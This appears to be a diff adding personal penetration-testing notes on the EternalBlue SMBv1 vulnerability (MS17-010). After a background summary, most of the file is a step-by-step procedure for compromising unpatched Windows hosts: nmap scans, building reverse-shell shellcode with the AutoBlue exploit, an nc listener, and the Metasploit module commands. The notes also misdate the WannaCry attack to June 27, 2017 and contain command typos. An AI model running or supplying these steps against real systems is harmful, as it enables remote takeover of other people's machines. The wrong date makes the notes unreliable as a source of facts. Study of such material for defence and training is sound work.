@@ -1,0 +1,64 @@
+> EternalBlue (MS17-010/CVE-2017-0144) is the name given to a collection of
+  Windows vulnerabilities and exploits that allow attackers to remotely execute
+  arbitrary code and gain access to a Windows system and consequently the
+  network that the target system is a part of.
+> The EternalBlue exploit was developed by the NSA (National Security Agency)
+  to take advantage of the MS17-010 vulnerability and was leaked to the public
+  by a hacker group called the Shadow Brokers in 2017.
+> The EternalBlue exploit takes advantage of a vulnerability in the Windows
+  SMBv1 protocol that allows attackers to send specially crafted packets that
+  consequently facilitate the execution of arbitrary commands.
+  
+> The EternalBlue exploit was used in the WannaCry ransomware attack on June
+  27, 2017 to exploit other Windows systems across networks with the objective
+  of spreading the ransomware to as many systems as possible.
+> This vulnerability affects multiple versions of Windows:
+  > Windows Vista
+  > Windows 7
+  > Windows Server 2008
+  > Windows 8.1
+  > Windows Server 2012
+  > Windows 10
+  > Windows Server 2016
+   
+> Microsoft released a patch for the vulnerability in March, 2017, however, many
+  users and companies have still not yet patched their systems.
+> The EternalBlue exploit has a MSF auxiliary module that can be used to check if
+  a target system if vulnerable to the exploit and also has an exploit module that
+  can be used to exploit the vulnerability on unpatched systems.
+> The EternalBlue exploit module can be used to exploit vulnerable Windows
+  systems and consequently provide us with a privileged meterpreter session on
+  the target system.
+> In addition to MSF modules, we can also manually exploit the vulnerability by
+  utilizing publicly available exploit code.
+  
+> AutoBlue-MS17-010: https://github.com/3ndG4me/AutoBlue-MS17-010
+
+
+
+> exploiting EternalBlue:
+> nmap -sV -p 445 -O <IP>
+> nmap -sV -p 445 --script smb-vuln-ms17-010 <IP>
+  > State: VULNERABLE
+
+manual exploit without msf:
+> git clone https://github.com/3ndG4me/AutoBlue-MS17-010
+  > pip install -r requirements.txt
+    > cd shellcode && chmod +x shell_prep.sh && ./shell_prep.sh
+      > kernel shellcode compile - Y
+      > LHOST <local IP>
+      > LPORT for x86 and x64 <local port>
+      > regular shell - 1
+      > stageless payload - 1
+      > output sc_x64.bin or sc_x84.bin
+> nc -lvnp <local port>
+> cd .. && python3 eternalblue_exploit7.py <IP> shellcode/sc_x64.bin or sc_x84.bin
+
+automatic exploit with msf:
+> msfconsole -q
+  > search eternalblue
+    > use exploiut/windows/smb/ms17_010_eternalblue
+      > set LHOST
+      > set LPORT
+      > set RHOSTS
+      > run
